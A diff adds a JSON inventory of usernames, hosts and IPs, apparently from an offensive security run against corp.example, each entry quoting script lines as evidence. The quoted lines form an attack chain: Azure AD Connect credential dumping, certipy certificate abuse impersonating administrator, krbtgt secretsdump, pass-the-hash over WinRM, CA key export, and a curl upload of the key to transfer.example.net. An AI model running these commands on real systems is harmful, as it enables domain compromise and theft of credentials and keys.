@@ -1,0 +1,132 @@
+[
+  {
+    "kind": "username",
+    "value": "MSOL_0a1b2c3d4e5f@corp.example",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 2,
+    "scripts": "20250301_103200_step05_certs.sh:5, 20250301_103200_step05_certs.sh:6",
+    "evidence": "certipy find -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)\ncertipy req -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -ca CORP-CA01 -template UserAuth -upn administrator@corp.example -target $CA_HOST -out admin_cert (20250301_103200_step05_certs.sh:6)"
+  },
+  {
+    "kind": "username",
+    "value": "administrator",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 4,
+    "scripts": "20250301_104000_step06_auth.sh:3, 20250301_104000_step06_auth.sh:4, 20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3",
+    "evidence": "certipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)\nsecretsdump.py -just-dc-user krbtgt -hashes :88********c (32 chars) corp.example/administrator@10.20.1.5 (20250301_104000_step06_auth.sh:4)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)"
+  },
+  {
+    "kind": "username",
+    "value": "svc_backup",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 3,
+    "scripts": "20250301_101800_step02_enum.sh:4, 20250301_101800_step02_enum.sh:8, 20250301_102300_step03_adsync.sh:7",
+    "evidence": "USER=\"${AD_USER:-svc_backup}\" (20250301_101800_step02_enum.sh:4)\nnxc smb \"$h\" -u \"$USER\" -p \"$PASS\" -d $DOMAIN --shares | tee -a 20250301_101845_step02_enum.log (20250301_101800_step02_enum.sh:8)\nnxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > \"$OUTFILE\" 2>&1 (20250301_102300_step03_adsync.sh:7)"
+  },
+  {
+    "kind": "username",
+    "value": "MSOL_0a1b2c3d4e5f",
+    "origin": "discovered",
+    "from": "20250301_101910_step02_users.tsv:2",
+    "scope": null,
+    "count": 1,
+    "scripts": "20250301_103200_step05_certs.sh:3",
+    "evidence": "MSOL_USER=\"MSOL_0a1b2c3d4e5f\" (20250301_103200_step05_certs.sh:3)"
+  },
+  {
+    "kind": "email",
+    "value": "administrator@corp.example",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20250301_103200_step05_certs.sh:6",
+    "evidence": "certipy req -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -ca CORP-CA01 -template UserAuth -upn administrator@corp.example -target $CA_HOST -out admin_cert (20250301_103200_step05_certs.sh:6)"
+  },
+  {
+    "kind": "device",
+    "value": "adfs.corp.example",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20250301_103200_step05_certs.sh:7",
+    "evidence": "openssl req -x509 -newkey rsa:2048 -nodes -keyout rogue.key -out rogue.crt -subj \"/CN=adfs.corp.example\" -days 365 (20250301_103200_step05_certs.sh:7)"
+  },
+  {
+    "kind": "device",
+    "value": "corp.example",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 5,
+    "scripts": "20250301_101800_step02_enum.sh:3, 20250301_102300_step03_adsync.sh:8, 20250301_102700_step03_adsync_v2.sh:7, 20250301_103200_step05_certs.sh:5, 20250301_104000_step06_auth.sh:3",
+    "evidence": "DOMAIN=\"corp.example\" (20250301_101800_step02_enum.sh:3)\nadconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)\npython3 /opt/tools/adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC > \"$OUTFILE\" 2>&1 (20250301_102700_step03_adsync_v2.sh:7)\ncertipy find -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)\ncertipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)"
+  },
+  {
+    "kind": "device",
+    "value": "transfer.example.net",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20250301_104500_step07_exfil.sh:4",
+    "evidence": "curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)"
+  },
+  {
+    "kind": "device",
+    "value": "ca01.corp.example",
+    "origin": "discovered",
+    "from": "20250301_101530_step01_recon.txt:6",
+    "scope": null,
+    "count": 2,
+    "scripts": "20250301_103200_step05_certs.sh:2",
+    "evidence": "CA_HOST=ca01.corp.example (20250301_103200_step05_certs.sh:2)"
+  },
+  {
+    "kind": "ip",
+    "value": "10.20.1.0/24",
+    "origin": "prior",
+    "from": null,
+    "scope": "private",
+    "count": 1,
+    "scripts": "20250301_101500_step01_recon.sh:3",
+    "evidence": "TARGET_NET=\"10.20.1.0/24\" (20250301_101500_step01_recon.sh:3)"
+  },
+  {
+    "kind": "ip",
+    "value": "10.20.1.17",
+    "origin": "discovered",
+    "from": "20250301_101530_step01_recon.txt:4",
+    "scope": "private",
+    "count": 3,
+    "scripts": "20250301_101800_step02_enum.sh:6, 20250301_102300_step03_adsync.sh:3, 20250301_102700_step03_adsync_v2.sh:3",
+    "evidence": "hosts=(10.20.1.5 10.20.1.17 10.20.1.23) (20250301_101800_step02_enum.sh:6)\nAADC=10.20.1.17 (20250301_102300_step03_adsync.sh:3)\nAADC=10.20.1.17 (20250301_102700_step03_adsync_v2.sh:3)"
+  },
+  {
+    "kind": "ip",
+    "value": "10.20.1.23",
+    "origin": "discovered",
+    "from": "20250301_101530_step01_recon.txt:6",
+    "scope": "private",
+    "count": 3,
+    "scripts": "20250301_101800_step02_enum.sh:6, 20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3",
+    "evidence": "hosts=(10.20.1.5 10.20.1.17 10.20.1.23) (20250301_101800_step02_enum.sh:6)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)"
+  },
+  {
+    "kind": "ip",
+    "value": "10.20.1.5",
+    "origin": "discovered",
+    "from": "20250301_101530_step01_recon.txt:2",
+    "scope": "private",
+    "count": 3,
+    "scripts": "20250301_101800_step02_enum.sh:2, 20250301_103200_step05_certs.sh:5, 20250301_104000_step06_auth.sh:3",
+    "evidence": "DC_IP=10.20.1.5 (20250301_101800_step02_enum.sh:2)\ncertipy find -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)\ncertipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)"
+  }
+]
